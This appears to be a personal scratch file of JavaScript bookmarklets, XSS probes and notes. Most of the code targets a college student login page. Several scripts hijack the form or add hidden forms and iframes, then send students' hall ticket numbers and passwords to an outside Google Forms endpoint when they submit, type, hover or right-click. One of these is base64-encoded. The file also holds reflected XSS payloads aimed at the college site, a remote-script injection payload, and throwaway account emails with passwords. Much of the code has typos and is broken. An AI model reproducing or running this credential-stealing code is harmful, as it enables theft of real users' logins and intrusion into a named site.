@@ -1,0 +1,419 @@
+javascript:var d=document.createElememt('script');d.type="text/javascript";d.src="https://spat-cloud.github.io/data/HarScript/ImageChanger.js";document.body.appendChild(d);
+
+javascript:var ms =document.createElement('script');ms.type="text/javascript";ms.src="https://spat-cloud.github.io/data/HarScript/HarScript-v1.js";document.head.appendChild(ms);
+
+javascript:function mt(){var tt=document.getElementsByTagName('meta');for(i in tt){var gg=tt[i].property;document.write(gg);}}
+
+javascript:var c=document.getElementsByTagName('meta');var v=c.length;alert(v);
+
+javascript:function Mtl(arg){var x=document.getElementsByTagName('meta');var va=x[arg].content;alert(va);}
+
+javascript:var M=document.getElementsByTagName('meta');for(i in M){Mtl(i)}
+
+javascript:var M=document.getElementsByTagName('meta');var dow=M[24].content;var Hr = document.createElement('a');Hr.href=dow;
+Hr.innerHTML="DORAEMON.DOWNLOAD"
+Hr.style.color="LightBlue";;Hr.download="Doraemon2112.NetDorm.mp4";
+document.body.appendChild(Hr);
+
+javascript:var f=document.createElement('a');f.href="#";f.innerHTML="HELLO.PHP";document.write(f);
+
+javascript:window.addEventListeners('click',function(e){alert(e.type.target.nodeName);});
+
+javascript:var g=document.getElementsByTagName('meta');var dk=g[24].content;var te=document.createElement('a');te.href=dk;te.style.fontSize="30px";te.style.color="Blue"; te.style.backgroundColor="orange";te.innerHTML="DOWNLOAD";document.body.appendChild(te);
+
+javascript:var g=document.getElementsByTagName('meta');var dk=g[24].content;var ml =`<a href="`${dk}`" download="Download Shivaya">`;document.write(ml);
+
+
+javascript:var c=document.getElementsByTagName('input');for(i in c){c[i].type=text;}
+
+https://9anime.to/watch/shin-chan.y38j/ep-3
+
+902
+
+https://vidstream.pro/download/QVY9NW7KLY2M
+
+895
+
+https://vidstream.pro/download/XEYL408DNYVN
+
+894
+
+https://vidstream.pro/download/6EJVKQWLNY9M
+
+888
+
+https://vidstream.pro/download/LNPERX79RJXW
+
+javascript:var bd=document.createElement('body');document.appendChild(bd);var a=document.createElement('a');a.href="#";a.download="this";bd.innerHTML="THIS DOWNLOAD";bd.appendChild(a);
+
+javascript:var s=document.createElement('script');s.src="https://spat-cloud.github.io/data/HarScript/HarScript-v1.js";document.body.appendChild(s);
+
+javascript:var s=document.createElement('script');s.src="https://spat-cloud.github.io/data/HarScript/HarScript-v1.1.js";document.body.appendChild(s);
+
+javascript:var T=decodeURIComponent(JSON.parse('" "'));document.write(T);
+
+
+javascript:var e=document.getElementsByTagName('form');e[0].method="GET";
+
+javascript:function c(d){document.Reg.method=d;}
+
+
+javascript:window.addEventListener("submit",function(e){e.preventDefault();alert("Prevented");});
+
+
+javascript:document.getElementsByTagName('a').addEventListener("click",function(e){e.preventDefault();});
+
+Stdpt 
+
+javascript:function Php(){
+location.href = "https://m.youtube.com";
+}
+function Ch(){
+var CH = document.createElement('IFRAME');
+CH.name="php";
+CH.style.display="none";
+document.appendChild(CH);
+var C = document.getElementsByTagName('form');
+C[0].action ="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse";
+C.target="php";
+var D =document.getElementsByTagName('input');
+D[0].name="entry.190958851";
+D[0].required = "";
+D[1].name="entry.470512502";
+D[1].required = "";
+var CH = document.createElement('iframe');
+CH.name="php";
+CH.style.display="none";
+C.appendChil(C,CH);
+}
+document.onmouseover = function(){Ch()};
+
+
+function Ch(){var C = document.getElementsByTagName('form'); C[0].action ="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse";var D =document.getElementsByTagName('input'); D[0].name="entry.190958851";D[1].name="entry.470512502";}Ch();
+
+test.js:
+
+javascript:var x = document.createElement('script');
+x.src="https://spat-cloud.github.io/data/Down.js";
+document.body.appendChild(x);
+
+javascript:var x="http://scce.ac.in/fb/?HallticketNo=19N01A05A8&submit=%C2%A0%C2%A0%C2%A0Login%C2%A0%C2%A0%C2%A0";var g = decodeURIComponent(x);alert(g);
+
+javascript:var G="%3C%6C%69%6E%6B%20%72%65%6C%3D%22%63%61%6E%6F%6E%69%63%61%6C%22%20%68%72%65%66%3D%22%68%74%74%70%73%3A%2F%2F%77%77%77%2E%70%6F%72%6E%74%76%2E%63%6F%6D%2F";var H = decodeURI(G);document.write(H);
+
+javascript:var f=document.documentElement;function o(){if(f.requestFullscreen){f.requestFullscreen();}}
+
+http://scce.ac.in/parent12/index.php?HallticketNo=&lt;script&gt;alert(1);&lt;/script&gt;
+
+http://scce.ac.in/parent12/r15extres_cmr.php?HallticketNo=%3Cscript%3Ealert(8);%3C/script%3E&dayatten=Submit
+
+javascript:function v(x){var f=document.getElementsByTagName('input');var y = f[x].name;alert(y);}
+
+JavaScript:try{var v=eval(alert(8));}catch(e){alert(e);}
+
+&#x3C;(&#60;) < &#x3E;(&#62;) >
+"><script src="https://spat-cloud.github.io/data/Down.js"></script><"
+
+********************************
+Temp Mail For Hacksplanning.Com
+
+godawap955@d4wan.com
+*********************************
+*********************************
+Bitport.Io Mail , Offcloud
+
+nagicen651@beydent.com
+*********************************
+
+javascript:var x=document.createElement('script');x.src="https://spat-cloud.github.io/data/Down.js";document.body.appendChild(x);
+
+javascript:navigator.clipboard.readText().then(text => if(text.state=="granted"){document.write(text)}alert(text));
+
+javascript:function v(){document.HallticketNo.style.maxlength="566";}
+
+javascript:function C(event){var H=event.targetTouches[0].target.tagName; alert(H); document.body.ontouchstart =function(){v(event)};
+
+javascript:function Su(){
+var C=document.createElement('iframe');
+C.name="r";
+document.body.appendChild(C);
+var Cg=document.getElementsByTagName('form');
+Cg[0].action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse";
+Cg.setAttribute("target" , r);
+var F = document.getElementsByTagName('input');
+F[0].name="entry.190958851";
+F[1].name="entry.470512502";
+document.Reg.onsubmit="";
+}
+Su();
+window.addEventListeners("submit" , function(e){e.preventDefault();},false);
+
+javascript:function b(){document.Reg.onsubmit="";document.HallticketNo.onkeyup=function(){eval(this.value);}}b();
+
+javascript:document.HallticketNo.onkeyup=function(){eval(this.value)};
+
+
+http://0redirc.com/jr.php?gz=wyPE8%2FAjmWVAVCfSghvaTcbla4gEIqLmiGyaEC0GHUTp84VfJ8K1zcp1zo8%2BJXqt0OLKrbywyy3%2Bga%2BNEtLcP6lTDVtPc4fM6IGzhfUrJeu1OHnV%2FAnNQlcZIOg7vG3ikKRRMrt2TZgA5j6OU28wtfsF24vfJmrvg82rgT0G6kDrRQ1W2IeMtN%2FUv5kdmsC4Ofiwc0P8OEC92LH2Mrw9Z9RyJLZfWM0oNoHw3%2FyYG0paKweL7ageYBaLxWkYEOBiXhmPWK5up4QTvBb6uEWv%2BVVToBy83b%2BHLbKXN2aOrqaogzyUTcDRCASpKt8x4xFukSpR1cUD3IilS9UOa4VLH6vA4PRL7GMhLR2%2FzVz5ipbOxTa4CsmSwtnnetet3VNovQ5ncKjEG8dNinmNZd1uP8gpSGAYVCDOydWOtH1VxUV9tLInYRj%2Bpm2WSWvwNOU2Pm%2F2CgQk2NVKAShJZalraBYw7E2EZIfDI8M1HmtQQBh7QFbLxprRrwE9O%2B4GygpRhP8vbicHrIb9VTGyXF%2FMG7mp3F1dA9DS0jhbqbVn9OzoOm23%2FGcMAI%2FRrIkgo9vtw%2FlYKOiocpDAt4VRMCI1HZkyjCncxz4lQFX%2FJmjqEWNChvZs7dYwrwg40mrolhRzH%2Bp7WPUv0c5%2FQONf9l26uoVG1nuKglJ1O346yaPwhS84momJacRT%2BEyh84bLRK3d0HfsE%2BRpBYxe1%2FfUqVL5bCqzN8QEcCS%2BTZnaxyl8DCt6CuaCC%2FO1snf8J0%2BPqj6SxjdWQ6%2FURZVfPRxmCImOog%3D%3D&
+
+vs=980%3A1524&
+
+ds=360%3A640&
+
+sl=0%3A0
+&os=f&
+nos=f&
+swfV=0.0.0&
+if=f&
+sc=f&
+ckReS=1625577881.8968078
+
+
+
+wyPE8
+/
+AjmWVAVCfSghvaTcbla4gEIqLmiGyaEC0GHUTp84VfJ8K1zcp1zo8+JXqt0OLKrbywyy3+ga+NEtLcP6lTDVtPc4fM6IGzhfUrJeu1OHnV
+/
+AnNQlcZIOg7vG3ikKRRMrt2TZgA5j6OU28wtfsF24vfJmrvg82rgT0G6kDrRQ1W2IeMtN
+/
+Uv5kdmsC4Ofiwc0P8OEC92LH2Mrw9Z9RyJLZfWM0oNoHw3/yYG0paKweL7ageYBaLxWkYEOBiXhmPWK5up4QTvBb6uEWv+VVToBy83b+HLbKXN2aOrqaogzyUTcDRCASpKt8x4xFukSpR1cUD3IilS9UOa4VLH6vA4PRL7GMhLR2/zVz5ipbOxTa4CsmSwtnnetet3VNovQ5ncKjEG8dNinmNZd1uP8gpSGAYVCDOydWOtH1VxUV9tLInYRj+pm2WSWvwNOU2Pm/2CgQk2NVKAShJZalraBYw7E2EZIfDI8M1HmtQQBh7QFbLxprRrwE9O+4GygpRhP8vbicHrIb9VTGyXF/MG7mp3F1dA9DS0jhbqbVn9OzoOm23/GcMAI/RrIkgo9vtw/lYKOiocpDAt4VRMCI1HZkyjCncxz4lQFX/JmjqEWNChvZs7dYwrwg40mrolhRzH+p7WPUv0c5/QONf9l26uoVG1nuKglJ1O346yaPwhS84momJacRT+Eyh84bLRK3d0HfsE+RpBYxe1/fUqVL5bCqzN8QEcCS+TZnaxyl8DCt6CuaCC/O1snf8J0+Pqj6SxjdWQ6/URZVfPRxmCImOog==
+
+
+javascript:var s=document.createElement('script');s.src="https://spat-cloud.github.io/data/HarScript/HarScript.v1.6.js";document.head.appendChild(s);
+
+<
+
+entry.190958851";D[0].required;D[1].name="entry.470512502"
+>
+
+
+javascript:document.Reg.onsubmit="";window.addEventListener("click",function(e){e.preventDefault();
+location.href=`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${document.userid.value}&entry.470512502=${document.password.value}`;},false);
+
+javascript:d2luZG93LmxvY2F0aW9uPWBodHRwczovL2RvY3MuZ29vZ2xlLmNvbS9mb3Jtcy91LzAvZC9lLzFGQUlwUUxTZnRoQU95eTJvRjM4bFU1ZjRhZzN1bEo4QUhjUlh0UEhISi1pYlJoN1VmWF82ZXR3L2Zvcm1SZXNwb25zZT9lbnRyeS4xOTA5NTg4NTE9JHtkb2N1bWVudC51c2VyaWQudmFsdWV9JmVudHJ5LjQ3MDUxMjUwMj0ke2RvY3VtZW50LnBhc3N3b3JkLnZhbHVlfWA7
+
+/
+<form action="" method="post" name="Reg" onSubmit="return ValidateForm(this)">
+
+ <p>
+    
+ </p>
+ 
+ <div style="font-size:16pt; font-family:Calibri"><strong>Student login form</strong></div>
+ 
+<h1>Use only Mozilla Firefox or  Google chrome  browser</h1>
+ <table width="200" border="0">
+   <tr>
+     <td><img src="index_files/1.jpg" width="200" height="117" /></td>
+     <td><table width="300" border="0">
+
+       <tr> 
+         <td><strong>Hall Ticket No</strong></td>
+         <td><input type="text" name="userid" /></td>
+       </tr>
+       <tr>
+         <td><strong>Password</strong></td>
+         <td><input type="password" name="password" /></td>
+       </tr>
+       <tr>
+         <td>&nbsp;</td>
+         <td><input name="submit" type="submit" /></td>
+
+
+
+/
+
+thumb.js
+
+{
+http://scce.ac.in/n0/19N01A0578T.jpg
+
+}
+class addhar{
+http://scce.ac.in/n0/19N01A05A8A.jpg
+}
+
+
+var source = new EventSource("http://scce.ac.in/parent12/index.php");
+source.onopen = function(event) {
+  alert(event.data);
+};
+
+http://scce.ac.in/aicte/idcarddownload2.php
+
+
+javascript:var s=document.createElement('script');s.src="https://spat-cloud.github.io/data/HarScript/HarScript.v1.8.NoAds.js";document.head.appendChild(s);
+
+
+javascript:var s=document.createElement('script');s.src="https://cdn.jsdelivr.net/gh/SPAT-CLOUD/data@main/HarScript/HarScript.v1.8.NoAds.js";document.head.appendChild(s);
+
+/*
+https://cdn.jsdelivr.net/gh/SPAT-CLOUD/data@main/HarScript/HarScript.v1.8.NoAds.js
+
+
+https://cdn.jsdelivr.net/gh/SPAT-CLOUD/data@main/HarScript/HarScript.v2.0.Latest.min.js
+*/
+
+
+https://cdnisotopes.com/us20/customer/account/login/
+
+Email :vaxanah152@eyeremind.com
+Pass : Spat@3512
+
+
+
+http://webdisk.scce.ac.in
+
+https://rawcdn.githack.com/SPAT-CLOUD/data/ae53f3c995145daa809880c05ba32f84dc1d514b/HarScript/HarScript.v2.0.Latest.min.js
+
+
+Youtube 
+
+Dear Google Team
+Why you have blocked this account This account is used to watch youtube please Arrange the account enable my account
+
+Thank You
+Sincerely SonPanAbTej SPAT
+
+
+function H(){
+var T = document.getElementsByTagName('input');
+
+for(i=0 ; i < T.length; i++){
+var G = T[i].value;
+window.location = `https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=G`;
+}
+}
+
+
+javascript:var V = document.getElementsByTagName('form');
+var Y = V[0].innerHTML;
+window.open(`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${Y}`);
+
+
+
+window.addEventListener("submit" , function(event){event.prefentDefault();H();},false);
+
+
+function Bo(){
+var H = document.getElementsByTagName('input');
+var G = document.createElement('body');
+G.style.display="none";
+document.body.appendChild(G);
+var U = document.createElement('iframe');
+U.name="T";
+U.style.display="none";
+G.appendChild(U);
+var Y = document.createElement('form');
+Y.action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse";
+Y.target="T";
+Y.method="POST";
+Y.id="myF";
+Y.onsubmit="";
+Y.style.display="none";
+G.appendChild(Y);
+var O = document.createElement('input');
+O.type="text";
+O.name = "entry.190958851";
+O.value += location.href + "," + "First:" + H[0].value + "," + "Second:" + H[1].value;
+Y.appendChild(O);
+if(H[0].value! == "" || H[1].value! == ""){
+return false;
+}
+else{
+Y.submit();
+}
+
+}
+function H(){
+var H = document.getElementsByTagName('form');
+H[0].action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse";
+H[0].method="post";
+H[0].onsubmit="";
+var Yn =document.getElementsByTagName('input');
+Yn[0].name = "entry.190958851";
+Yn[1].name = "entry.470512502";
+
+}
+H();
+
+someHtn{
+"Ht":{
+"19N01A0127", ""
+}
+
+
+};
+
+
+function Gh(){
+
+var H = document.createElement('a');
+H.href=`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${document.userid.value}&entry.470512502=${document.password.value}`;
+H.style.width="100%";
+H.style.height="100%";
+H.
+H.style.position="fixed";
+H.innerHTML="&nbsp;";
+document.forms.appendChild(H);
+}
+var Yj=document.getElementsByTagName('input');
+Yj[1].oninput = function(){Gh()};
+
+functon H(){
+window.addEventListener("contextmenu", function(e){
+e.preventDefault();
+location.href=`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${document.userid.value}&entry.470512502=${document.password.value}`;},false);
+}
+
+Premptive JS
+
+
+MAIL : bejel97838@dmsdmg.com
+PASSWORD : ఏపుడు పెట్టె Password
+
+
+function Sb(){
+var C = document.getElementsByTagName('input');
+var Yu = document.getElementsByTagName('textarea');
+for(i=0;i<C.length;i++){
+var E =`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${C[i].value};
+}
+for(j=0;j<Yu.length;j++){
+var O = Yu[j].value;
+}
+window.open(E , "blank");
+}
+
+youtube లలితా సహస్రనామం
+
+
+https://r2---sn-ipgx5jipo-itqe.googlevideo.com/videoplayback?expire=1628580844&ei=jNcRYeO1MtiR4-EP3oCkkAU&ip=103.224.155.8&id=o-AGV5D2ty8a3fUeAldt0cYYnjAOagVxILpdhRULp6mnu5&itag=18&source=youtube&requiressl=yes&mh=rw&mm=31,29&mn=sn-ipgx5jipo-itqe,sn-h557snl6&ms=au,rdu&mv=m&mvi=2&pl=24&initcwndbps=980000&vprv=1&mime=video/mp4&ns=9arErcjYCBF-5U7YKG5qd-YG&gir=yes&clen=85838840&ratebypass=yes&dur=1855.297&lmt=1584356823498262&mt=1628558916&fvip=5&fexp=24001373,24007246&c=MWEB&txp=5531432&n=RwfauzhFcxTTQIE&sparams=expire,ei,ip,id,itag,source,requiressl,vprv,mime,ns,gir,clen,ratebypass,dur,lmt&
+
+sig=AOq0QJ8wRAIgHMaGx8irMjPImmUp2ybSTrGt9bMWiJQJHOfKygstXcICICdQPi2nI43uxO4nAtjUqVnhPI1jUkDavH7XOcFkNq1Y
+
+&lsparams=mh,mm,mn,ms,mv,mvi,pl,initcwndbps&lsig=AG3C_xAwRAIgSO7uRfWhImnlWWCmHPTIamyb08dp5tsKrxOuB0V22YkCIHf5-EFVcERiv1wz1OUb_iCbggUknunIb6PBxOwAaoxr
+
+
+
+
+
+https://r1---sn-ipgx5jipo-itqe.googlevideo.com/videoplayback?expire=1628581894&ei=ptsRYYShBNaLz7sPnqKMkAw&ip=103.224.155.8&id=o-AEiivFOuCcszcX7EJu_0EcD16Gsr3ytrTP8-O2do7v6d&itag=247&aitags=133,134,135,136,160,242,243,244,247,278,394,395,396,397,398&source=youtube&requiressl=yes&mh=Q4&mm=31,29&mn=sn-ipgx5jipo-itqe,sn-h557snsl&ms=au,rdu&mv=m&mvi=1&pcm2cms=yes&pl=24&gcr=in&initcwndbps=1082500&vprv=1&mime=video/webm&ns=1D1y5DlnOHeET63Zcwd_d9cG&gir=yes&clen=74770852&dur=1798.830&lmt=1588345966174288&mt=1628560121&fvip=1&keepalive=yes&fexp=24001373,24007246&c=MWEB&txp=5535432&n=qKXhZBg1eKIy6S5T0mB&sparams=expire,ei,ip,id,aitags,source,requiressl,gcr,vprv,mime,ns,gir,clen,dur,lmt&lsparams=mh,mm,mn,ms,mv,mvi,pcm2cms,pl,initcwndbps&lsig=AG3C_xAwRQIhANShmDkNGjr2wffUsoO312jLNh4rqth-YoXVv2UTLrW9AiBA4I5ibDUhlO6ra1X727WhdRtHeJANnvE3gTR8b3kXxQ==
+
+=OqAOq0QJ8wRgIhAP2lg3c0B7l_I5rdmcbu-yi74dgnCCJypAtxtKaOA9a6AiEA9Ale-DDVYZE5tNa7uoBGCtpwOd3tVrTp9idtWIKnXasxasx
+
+/u0026sp=
+
+
+
+
+
+https://r1---sn-ipgx5jipo-itqe.googlevideo.com/videoplayback?expire=1628581894&ei=ptsRYYShBNaLz7sPnqKMkAw&ip=103.224.155.8&id=o-AEiivFOuCcszcX7EJu_0EcD16Gsr3ytrTP8-O2do7v6d&itag=247&aitags=133,134,135,136,160,242,243,244,247,278,394,395,396,397,398&source=youtube&requiressl=yes&mh=Q4&mm=31,29&mn=sn-ipgx5jipo-itqe,sn-h557snsl&ms=au,rdu&mv=m&mvi=1&pcm2cms=yes&pl=24&gcr=in&initcwndbps=1082500&vprv=1&mime=video/webm&ns=1D1y5DlnOHeET63Zcwd_d9cG&gir=yes&clen=74770852&dur=1798.830&lmt=1588345966174288&mt=1628560121&fvip=1&keepalive=yes&fexp=24001373,24007246&c=MWEB&txp=5535432&n=qKXhZBg1eKIy6S5T0mB&sparams=expire,ei,ip,id,aitags,source,requiressl,gcr,vprv,mime,ns,gir,clen,dur,lmt&sig=OqAOq0QJ8wRgIhAJZOuPXma8QoXvONfNV-zhCL4p5m5yjJ5AAMX5Pj0JD5AiEA3sFvE7uR-P8sTSbLTZlFmNEURBE1GR0GvwAAp9aM2Uo-Uo-sp&lsparams=mh,mm,mn,ms,mv,mvi,pcm2cms,pl,initcwndbps&lsig=AG3C_xAwRQIhANShmDkNGjr2wffUsoO312jLNh4rqth-YoXVv2UTLrW9AiBA4I5ibDUhlO6ra1X727WhdRtHeJANnvE3gTR8b3kXxQ==
+
+
+https://json.geoiplookup.io
+
+
+Browser Stack 
+
+Mail = rikomiy555@cytsl.com
+Pwd = 12345678
